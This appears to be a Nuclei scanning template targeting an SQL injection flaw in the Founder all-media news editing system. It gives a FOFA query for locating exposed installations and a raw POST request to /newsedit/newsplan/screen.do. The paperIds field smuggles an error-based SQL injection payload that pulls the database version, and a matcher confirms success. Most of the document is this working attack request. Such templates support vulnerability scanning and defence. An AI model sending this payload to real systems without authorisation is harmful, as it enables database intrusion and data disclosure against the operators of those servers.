id: fangzheng-screen-sqli

info:
  name: fangzheng-xinwencaibian-reportCenter-sqli
  author: PokerSec
  severity: high
  metadata:
    fofasearch: app="FOUNDER-全媒体采编系统"

http:
  - raw:
      - |
        POST /newsedit/newsplan/screen.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
 
        method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=123+AND+2675+in+(select+@@version)&terminalType=123

    matchers: 
      - type: dsl
        condition: and
        dsl:
          - status_code == 200 &&  contains_all(body, 'nvarchar')